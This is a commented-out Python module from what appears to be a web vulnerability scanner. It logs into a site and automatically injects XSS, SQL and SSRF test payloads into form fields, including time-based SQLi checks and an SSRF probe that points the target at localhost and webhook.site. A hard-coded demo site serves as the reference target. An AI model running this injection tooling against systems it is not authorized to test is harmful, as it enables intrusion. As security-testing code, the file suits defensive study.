# import requests
# import json, hashlib
# from bs4 import BeautifulSoup
# from urllib.parse import urlparse
# from time import sleep
# from timeit import default_timer as timer
# from selenium.webdriver.support import expected_conditions as EC
# from selenium.webdriver.support.ui import WebDriverWait
# from selenium.webdriver.chrome.options import Options
# from seleniumwire import webdriver
# from selenium.webdriver.common.by import By 
# from selenium.webdriver.common.keys import Keys
# from datetime import timedelta
# from scripts.sql_errors import sql_error_check
# from seleniumBot import login_get_cookie_jar

# def create_webdriver():
#     try:
#         # Try creating a Chrome webdriver
#         chrome_options = Options()
#         chrome_options.add_argument("headless")
#         return webdriver.Chrome(options=chrome_options)
#     except:
#         try:
#             # Try creating a Firefox webdriver
#             firefox_options = webdriver.FirefoxOptions()
#             firefox_options.add_argument("headless") 
#             return webdriver.Firefox(options=firefox_options)
#         except:
#             try:
#                 from selenium.webdriver.edge.options import Options as EdgeOptions
#                 # Try creating an Edge webdriver
#                 options = EdgeOptions()
#                 options.use_chromium = True
#                 options.add_argument("headless")
#                 return webdriver.Edge(options=options)
#             except:
#                 raise Exception("No suitable browser found")

# def selenium_login(driver, url, username, password): # login using selenium
#     login_url = url + '/login'
#     driver.get(login_url)
#     driver.find_element(By.ID, 'loginId').send_keys(username) # double check login id and password id fields
#     driver.find_element(By.ID, 'password').send_keys(password, Keys.RETURN)
#     sleep(5)
#     return driver

# def __xss_attribute_check(body,payload_value):

#     if payload_value in body :
#         return True
#     return False

# def __xss_triggered_check(url, browser):
#     browser.get(url)
#     try:
#         WebDriverWait(browser, 3).until(EC.alert_is_present(),'Timed out')
#         alert = browser.switch_to.alert
#         alert.accept()
#         return True
#     except:
#         return False

# def xss_injection(baseurl, endpoint, method, params) : # params - input field's id in dict

#     if endpoint == baseurl + "/authenticate" :
#         session_cookie = login_get_cookie_jar(baseurl, params['loginId'], params['password'])
#         # response = requests.post(endpoint, data=params)
#         if session_cookie != -1 :
#             cookie_storage.append(session_cookie)

#             # selenium login
#             driver = create_webdriver()
#             browser = selenium_login(driver, baseurl, params['loginId'], params['password']) 
#     else :
#         browser = create_webdriver()

#     print(f"Injecting into : {endpoint}")
    
#     # Injecting into POST/PUT req
#     for payload in xss_payload_list :
#         for key in params.keys() :
#             params[key] = payload

#         if cookie_storage :
#             response = method(endpoint, data=params, cookies=cookie_storage[0])
#             # response = requests.post(endpoint, data=params, cookies=cookie_storage[0])
#         else :
#             response = method(endpoint, data=params)
#             # response = requests.post(endpoint, data=params)
#         sleep(1)
#         print(f"Payload injected into {endpoint}\n{params}")
        
#         xss = __xss_attribute_check(response.text, payload) # check if there is input validation/sanitization
#         if xss :
#             vuln_endpoint = {"Endpoint" : endpoint, "Payload" : payload}
#             with open(xss_vuln_file, 'a') as file :
#                 file.write(json.dumps(vuln_endpoint) + '\n')
#             # affected_urls.append(vuln_endpoint) # write vuln endpoint into file
#             break
#     print("Done injecting...\n")

# def sql_injection(baseurl, endpoint, method, params) : # params - input field's id in dict

#     if endpoint == baseurl + "/authenticate" :
#         session_cookie = login_get_cookie_jar(baseurl, params['loginId'], params['password'])
#         # response = requests.post(endpoint, data=params)
#         # session_cookie = response.cookies
#         if session_cookie != -1 :
#             cookie_storage.append(session_cookie)

#     # print(f"Injecting into : {endpoint}")
#     for payload in sql_payload_list :
#         for key in params.keys() :
#             params[key] = payload
#         print(f"Payload injected into {endpoint}\n{params}")
        
#         delay_time_s = 5
#         time_based_keyword = ["SLEEP", "DELAY", "WAIT", str(delay_time_s)]
#         if any(keyword in payload for keyword in time_based_keyword) : # inject time base payload
#             start = timer()
#             if cookie_storage :
#                 response = method(endpoint, data=params, cookies=cookie_storage[0])
#                 # response = requests.post(endpoint, data=params, cookies=cookie_storage[0])
#             else :
#                 response = method(endpoint, data=params)
#                 # response = requests.post(endpoint, data=params)
#             end = timer()

#             if timedelta(seconds=end - start) >= timedelta(seconds=delay_time_s) :
#                 print("Time Based SQLi worked")
#                 vuln_endpoint = {'Endpoint' : endpoint, 'Payload' : payload, "Error" : f"Response time was delayed for {delay_time_s} seconds."}
#                 with open(sql_vuln_file, 'a') as file :
#                     file.write(json.dumps(vuln_endpoint) + '\n')
#                 # sql_affected_urls.append(vuln_endpoint) # write to sql vuln file
#                 break # end loop if detected blind sqli

#         else : # inject not paylods that is not time based
#             if cookie_storage :
#                 response = method(endpoint, data=params, cookies=cookie_storage[0])
#                 # response = requests.post(endpoint, data=params, cookies=cookie_storage[0])
#             else :
#                 response = method(endpoint, data=params)
#                 # response = requests.post(endpoint, data=params)
#         sleep(1)

#         # check whether app is vuln to sqli
#         error = sql_error_check(response.text, error_xml_file)
#         if error != -1 :
#             vuln_endpoint = {"Endpoint" : endpoint, "Payload" : payload, "Error" : error}
#             with open(sql_vuln_file, 'a') as file :
#                 file.write(json.dumps(vuln_endpoint) + '\n')
#             # sql_affected_urls.append(vuln_endpoint) # write to sql vuln file
#             break
#         else :
#             if response.status_code == 500 :
#                 error = f"{response.reason} - {response.status_code}"
#                 # input(response.text)
#                 vuln_endpoint = {"Endpoint" : endpoint, "Payload" : payload, "Error" : error}
#                 with open(sql_vuln_file, 'a') as file :
#                     file.write(json.dumps(vuln_endpoint) + '\n')
#                 # sql_affected_urls.append(vuln_endpoint) # write to sql vuln file
#                 break
    
#     print("Done injecting...")
#     print(f"Errors : {error}\n")

# def ssrf(baseurl, endpoint, method, params, token1) : # params - input field's id in dict
#     site_return_hash = requests.get("https://chmsdemo.greenfossil.com/login")
#     site_return_hash = site_return_hash.text
#     if endpoint == baseurl + "/authenticate" :
#         session_cookie = login_get_cookie_jar(baseurl, params['loginId'], params['password'])
#         # response = requests.post(endpoint, data=params)
#         # session_cookie = response.cookies
#         if session_cookie != -1 :
#             cookie_storage.append(session_cookie)
#     # internal injecting happens here:
#     for key in params.keys() :
#         params[key] = 'https://127.0.0.1/login'
#     print(f"Payload injected into {endpoint}\n{params}")
#     response = method(endpoint, data=params, cookies=cookie_storage[0]) # )
#     hashresponse  = response.text
#     if hashresponse == site_return_hash:
#         print("SSRF injection is successful")
#         with open(ssrf_vuln_file, 'a') as file :
#             vuln_endpoint = {"Endpoint" : endpoint, "Payload" : 'https://127.0.0.1/login', "direction" : "internal"}
#             file.write(json.dumps(vuln_endpoint) + '\n')
#     else: # external injection happens here:
#         for key in params.keys():
#             params[key] = f'https://webhook.site/{token1}'
#         print(f"Payload injected into {endpoint}\n{params}")
#         # get the old count
#         resp = requests.get(f"https://webhook.site/token/{token1}/requests")
#         count = json.loads(resp.text)["total"]
#         method(endpoint, data=params, cookies=cookie_storage[0]) # )
#         resp = requests.get(f"https://webhook.site/token/{token1}/requests")
#         new_count = json.loads(resp.text)["total"]
#         if new_count > count:
#             vuln_endpoint = {"Endpoint" : endpoint, "Payload" : f'https://webhook.site/{token1}', "direction" : "external"}
#     print("Done injecting...")

# cookie_storage = []
# error_xml_file = 'scripts/errors.xml'
# sql_vuln_file = 'injection-results/sql_vuln_endpoints.txt'
# xss_vuln_file = 'injection-results/xss_vuln_endpoints.txt'
# ssrf_vuln_file = 'injection-results/ssrf_vuln_endpoints.txt'
# # put sql payloads into list
# sql_payloadfile='sqlpayload.txt'
# text_file = open(sql_payloadfile, "r")
# sql_payload_list = text_file.read().split('\n')
# text_file.close()
# # print(f"sql payloads : {sql_payload_list}")

# xss_payloadfile ='xsspayload.txt'
# text_file = open(xss_payloadfile, "r")
# xss_payload_list = text_file.read().split('\n')
# text_file.close()
# site_return_hash = requests.get("https://chmsdemo.greenfossil.com/login")

# def stripcsrfvalue(htmlresp):
#     soup = BeautifulSoup(htmlresp.text, 'html.parser')
#     elements_with_name = soup.find_all(attrs={'name': True})
#     elements_with_name[0]['value'] = "None"
#     elements_adminpanel = soup.find('a', {'href': '/admin'})
#     if elements_adminpanel:
#         next = elements_adminpanel.find_next()
#         elements_adminpanel.extract()
#         next.extract()
#     soup = soup.prettify().replace('\n', '')
#     return soup

# site_return_hash = site_return_hash.text